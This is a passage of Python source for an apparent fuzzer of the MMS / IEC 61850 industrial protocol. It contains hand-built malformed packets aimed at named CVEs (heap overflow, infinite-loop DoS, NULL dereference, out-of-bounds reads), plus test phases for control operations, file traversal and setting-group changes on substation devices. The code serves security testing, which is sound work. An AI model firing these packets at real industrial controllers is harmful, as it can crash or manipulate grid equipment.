        # MMS Initiate-Request negotiation fuzzing - CVE-2026-49035 heap overflow
        # (CWE-122, CVSS 9.2, RCE-class). The pristine Initiate is used ONLY to
        # bring up the association in _define_state_machine; here we make the
        # Initiate itself a fuzzable attack surface. Each Group value is a fully
        # framed packet that establishes its OWN association, so mutating the
        # negotiation fields never poisons the stateful setup other requests
        # (MMS_ASSOCIATED) depend on.
        initiate_negotiation_req = Request(
            name="MMS_Initiate_Negotiation",
            children=(
                Group(
                    name="initiate_variants",
                    values=self._build_initiate_negotiation_variants(),
                ),
            ),
        )

        # ISO Presentation parseNormalModeParameters infinite loop / DoS -
        # CVE-2022-21159 (CWE-835, EPSS ~77%, TALOS-2022-1467). Malformed
        # normal-mode-parameters [2] SEQUENCE inside the CP-type SET, delivered
        # over a Session CONNECT SPDU (the association / CP layer, pre-MMS).
        pres_normalmode_req = Request(
            name="MMS_Presentation_NormalMode",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x14"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Static(name="session_connect", default_value=b"\x0d\x00"),  # Session CONNECT SPDU
                # CP-type SET (0x31) { mode-selector [0], normal-mode-parameters [2] }
                Static(name="cp_type_set_tag", default_value=b"\x31"),
                Static(name="cp_type_len", default_value=b"\x80"),  # indefinite -> streaming parse
                Static(name="mode_selector", default_value=b"\xa0\x03\x80\x01\x01"),
                Static(name="normal_mode_tag", default_value=b"\xa2"),  # [2] normal-mode-parameters
                Group(
                    name="normal_mode_body",
                    values=[
                        b"\x80",  # indefinite length, never terminated
                        b"\x00",  # empty normal-mode-parameters
                        b"\x81\xff",  # length lie: claims 255, no content
                        b"\x04\xa4\x80\x00\x00",  # context-def-list [4] indefinite, empty
                        b"\x06\xa4\x03\x30\x80\x00",  # nested SEQUENCE indefinite, unterminated
                        b"\x05\xa4\x81\xff\x00\x00",  # context-def-list length lie
                        b"\x03\xa0\x80\x00",  # unterminated sub-field
                    ],
                ),
            ),
        )

        # Write to a Named Variable List with an EMPTY listOfData - CVE-2026-50032
        # NULL deref (CWE-476). variableAccessSpecification names a variable list
        # ([1] variableListName -> ObjectName) but listOfData [0] carries zero
        # Data elements. Each Group value is a fully framed packet.
        _domain = self.config.get_option("domain_name", "AA11")
        _vmd_list = encode_ber_context_tag(
            1, encode_ber_context_tag(0, b"FUZZLIST", False), True
        )  # variableListName [1] -> vmd-specific ObjectName [0]
        _dom_list = encode_ber_context_tag(
            1,
            encode_ber_context_tag(
                1,
                encode_ber_context_tag(0, _domain.encode("ascii"), False)
                + encode_ber_context_tag(1, b"FUZZLIST", False),
                True,
            ),
            True,
        )  # variableListName [1] -> domain-specific ObjectName [1]
        _aa_list = encode_ber_context_tag(
            1, encode_ber_context_tag(2, b"FUZZLIST", False), True
        )  # variableListName [1] -> aa-specific ObjectName [2]
        _empty_lod = b"\xa0\x00"  # listOfData [0] with zero Data elements
        _null_lod = b"\xa0\x02\x80\x00"  # listOfData [0] w/ one empty Data

        def _build_empty_varlist_pkt(access_spec: bytes, list_of_data: bytes) -> bytes:
            pdu = self._create_confirmed_request(
                self._next_invoke_id(), self.SERVICE_WRITE, access_spec + list_of_data
            )
            return wrap_in_tpkt_cotp(pdu) if self.use_osi_stack else pdu

        write_empty_varlist_req = Request(
            name="MMS_Write_EmptyVarList",
            children=(
                Group(
                    name="empty_varlist_variants",
                    values=[
                        _build_empty_varlist_pkt(_vmd_list, _empty_lod),  # primary NULL-deref path
                        _build_empty_varlist_pkt(_dom_list, _empty_lod),
                        _build_empty_varlist_pkt(_aa_list, _empty_lod),
                        _build_empty_varlist_pkt(_vmd_list, _null_lod),  # one empty Data element
                    ],
                ),
            ),
        )

        # BER length-lie / extended-tag / zero-length AP-title OOB reads across
        # the confirmed-request corpus - CVE-2026-65421 / -66349 / -63550 /
        # -56758 (OOB read family). Extends the OCTET_STRING/BIT_STRING length
        # lie to fixed-width BER primitives (INTEGER/BOOLEAN with unvalidated
        # length), extended multi-byte BER tags, and a zero-length ACSE AARQ
        # calling-AP-title. Raw probes fired straight at the ASN.1 length parser
        # (COTP DT + body), matching this file's other raw length-lie requests.
        ber_length_oob_req = Request(
            name="MMS_BER_Length_OOB",
            children=(
                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
                Group(
                    name="ber_oob_body",
                    values=[
                        # fixed-width BER primitive length lies (INTEGER / BOOLEAN)
                        b"\xa0\x0a\x02\x7f\x01\xa4\x03\x80\x01\x00",  # invokeID INTEGER len=0x7f, 1 byte
                        b"\xa0\x08\x02\x01\x01\xa4\x03\x01\x04\xff",  # BOOLEAN len=4, 1 byte present
                        b"\xa0\x06\x02\x01\x01\xa4\xff\x30",  # Read service [4] length lie 0xff
                        # extended (multi-byte high-tag-number) BER tags
                        b"\xa0\x06\x02\x01\x01\x1f\x81\x00\x00",  # high-tag primitive 1f 81 00
                        b"\xa0\x08\x02\x01\x01\x3f\x81\x7f\x82\xff\xff",  # constructed high-tag + len lie
                        b"\xa0\x05\x1f\xff\x7f\x01\x00",  # oversized multi-byte tag number
                        # zero-length ACSE AARQ calling-AP-title (context [6])
                        b"\x60\x0a\xa1\x02\x06\x00\xa6\x00\xa7\x00",  # AARQ, calling-AP-title a6 00
                        b"\x60\x08\xa2\x00\xa6\x00\xa7\x00\x00",  # zero-len called + calling AP-title
                    ],
                ),
            ),
        )

        # ================================================================
        # OPTIMIZED REQUEST ORDERING (session.connect calls)
        # ================================================================

        # ==================== PHASE 1: QUICK COVERAGE (~30 sec) ====================
        # Touch all MMS services once for maximum breadth
        if self.is_request_enabled("MMS_Baseline"):
            self.session.connect(quick_service_coverage)
            self.session.connect(baseline_read_req)

        # ==================== PHASE 2: HIGH-CRASH TESTS (~3 min) ====================
        # Buffer overflow and memory corruption attacks (CVE-2015-6574 pattern)
        if self.is_request_enabled("MMS_Buffer_Overflow"):
            self.session.connect(overflow_req)
            self.session.connect(large_pdu_overflow)

        # ASN.1/BER encoding attacks
        if self.is_request_enabled("MMS_ASN1_Attacks"):
            self.session.connect(asn1_req)
            self.session.connect(nested_depth_attack)
            self.session.connect(ber_tag_confusion_req)

        # OSI layer attacks (COTP, Session, Presentation, ACSE)
        if self.is_request_enabled("MMS_OSI_Layer"):
            self._add_osi_layer_tests()

        # Crafted MMS Initiate negotiation heap overflow (CVE-2026-49035)
        if self.is_request_enabled("MMS_Initiate_Negotiation"):
            self.session.connect(initiate_negotiation_req)

        # Presentation parseNormalModeParameters infinite loop (CVE-2022-21159)
        if self.is_request_enabled("MMS_Presentation_NormalMode"):
            self.session.connect(pres_normalmode_req)

        # DeleteNamedVariableList DoS (CVE-2024-26529) + oversized Define
        if self.is_request_enabled("MMS_DeleteNamedVariableList"):
            self.session.connect(delete_nvl_req)
            self.session.connect(define_nvl_req)

        # BIT_STRING unused-bits / length overflow (CVE-2020-7054)
        if self.is_request_enabled("MMS_BitString_UnusedBits"):
            self.session.connect(bitstring_req)

        # OCTET_STRING BER length lie (over-read)
        if self.is_request_enabled("MMS_OctetString_Length_Lie"):
            self.session.connect(octetstring_req)

        # BER length-lie / extended-tag / zero-length AP-title OOB read family
        # (CVE-2026-65421 / -66349 / -63550 / -56758)
        if self.is_request_enabled("MMS_BER_Length_OOB"):
            self.session.connect(ber_length_oob_req)

        # ==================== PHASE 3: CVE-TARGETED OPERATIONS (~3 min) ====================
        # Write operations (primary CVE target)
        if self.is_request_enabled("MMS_Write_Operations"):
            self.session.connect(write_req)
            self.session.connect(write_overflow)

        # Write to Named Variable List with empty listOfData NULL deref (CVE-2026-50032)
        if self.is_request_enabled("MMS_Write_EmptyVarList"):
            self.session.connect(write_empty_varlist_req)

        # Control operations (IEC 61850 CVE-2019-6604)
        if self.is_request_enabled("MMS_Control_Operations"):
            if self.config.get_option("control_model", 0) == 1:
                self.session.connect(control_select_req)
                self.session.connect(control_operate_req)
            else:
                self.session.connect(control_direct_req)
            self.session.connect(control_addcause_attack)

        # File services (directory traversal)
        if self.is_request_enabled("MMS_File_Services"):
            if self.config.get_option("enable_file_services", False):
                self.session.connect(file_open_req)
            self.session.connect(file_traversal)

        # ==================== PHASE 4: BOUNDARY ATTACKS (~3 min) ====================
        if self.is_request_enabled("MMS_Invoke_ID"):
            self.session.connect(invoke_id_req)

        if self.is_request_enabled("MMS_IEC61850_Attacks"):
            self.session.connect(iec61850_req)

        if self.is_request_enabled("MMS_Malformed_PDU"):
            self.session.connect(malformed_req)
            self.session.connect(pdu_type_boundary)

        # Deeply nested structured/array data value (recursive decode depth)
        if self.is_request_enabled("MMS_Structured_Nesting"):
            self.session.connect(structured_nesting_req)

        # ==================== PHASE 5: REMAINING TESTS ====================
        # Read operations (lower crash priority)
        if self.is_request_enabled("MMS_Read_Operations"):
            self.session.connect(read_req)
            self.session.connect(namelist_req)
            self.session.connect(identify_req)

        # Information reports
        if self.is_request_enabled("MMS_Reports"):
            if self.config.get_option("enable_reports", True):
                self.session.connect(report_req)

        # Session management
        if self.is_request_enabled("MMS_Session_Mgmt"):
            self.session.connect(session_req)

        # ==================== ACSE AUTHENTICATION FUZZING ====================
        if self.is_request_enabled("MMS_ACSE_Auth") and self.config.get_option(
            "enable_auth", False
        ):
            self.session.connect(acse_auth_aarq)
            self.session.connect(acse_auth_mechanisms)
            self.session.connect(acse_cert_auth)
            self.session.connect(acse_auth_malformed)

        # ==================== IED MODE: GOOSE/SV/SETTING GROUPS ====================
        if self.config.get_option("ied_mode", False):
            self._define_ied_protocol()

    def _create_goose_subscription(self) -> bytes:
        """Create GOOSE subscription request"""
        domain = self.config.get_option("domain_name", "AA11")
        goose_ref = f"{domain}/LLN0$GO$gcb01"

        # Build subscription structure
        var_spec = self._create_variable_specification(domain, goose_ref)

        # Subscription parameters
        params = (
            encode_ber_context_tag(0, b"\x01", False)  # Enable
            + encode_ber_context_tag(1, struct.pack(">H", 1000), False)  # AppID
            + encode_ber_context_tag(2, b"\x00\x01\x02\x03\x04\x05", False)  # MAC
        )

        list_of_data = encode_ber_context_tag(0, params, True)
        service_data = var_spec + list_of_data

        return self._create_confirmed_request(
            self._next_invoke_id(), self.SERVICE_WRITE, service_data
        )

    def _create_setting_group_change(self, group_num: int = 2) -> bytes:
        """Create setting group change request"""
        domain = self.config.get_option("domain_name", "AA11")
        sg_ref = f"{domain}/LLN0$SG$ActSG"

        var_spec = self._create_variable_specification(domain, sg_ref)
        sg_value = encode_ber_context_tag(5, struct.pack(">B", group_num), False)
        list_of_data = encode_ber_context_tag(0, sg_value, True)

        service_data = var_spec + list_of_data
        return self._create_confirmed_request(
            self._next_invoke_id(), self.SERVICE_WRITE, service_data
        )

    def _define_ied_protocol(self) -> None:
        """Define IED-specific protocol messages (GOOSE, setting groups, disturbance records)"""
        # GOOSE subscription manipulation
        goose_req = Request(
            name="ied_goose",
            children=(
                Static(
                    name="goose_pdu_header", default_value=self._create_goose_subscription()[:20]
                ),
                SmartBytes(name="goose_params", size=30, fuzzable=True),
            ),
        )
        self.session.connect(goose_req)

        # Setting group attacks
        sg_req = Request(
            name="ied_setting_groups",
            children=(
                Static(
                    name="sg_pdu_header", default_value=self._create_setting_group_change()[:15]
                ),
                Group(
                    name="sg_number",
                    values=[
                        struct.pack(">B", 0),  # Invalid SG 0
                        struct.pack(">B", 255),  # Max SG
                        struct.pack(">H", 1000),  # Multi-byte SG
                    ],
                ),
            ),
        )
        self.session.connect(sg_req)

        # Disturbance recording requests
        dr_req = Request(
            name="ied_disturbance_records",
            children=(
                SmartString(
                    name="comtrade_file", default_value="DR/FAULT_9999.cfg", size=50, fuzzable=True
                ),
            ),
        )
        self.session.connect(dr_req)
